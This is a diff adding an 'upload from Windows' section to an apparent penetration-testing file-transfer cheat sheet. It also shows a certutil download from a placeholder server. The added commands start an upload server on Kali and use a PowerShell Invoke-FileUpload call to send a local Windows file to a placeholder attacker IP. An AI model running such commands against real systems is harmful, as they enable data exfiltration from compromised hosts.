@@ -92,6 +92,20 @@ Certutil
 certutil -urlcache -split -f 'http://<http server IP>:8000/<filename>' <path_destiny><filename>
 ```
 
+### upload from Windows
+
+Start HTTP upload server on Kali
+
+```bash
+python3 -m uploadserver 9090
+```
+
+Load PS lib [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) and execute `Invoke-FileUpload`.
+
+```powershell
+Invoke-FileUpload -File C:\Temp\file.txt -Uri http://<HTTP Server IP>:9090/upload
+```
+
 ### download to Linux
 
 wget
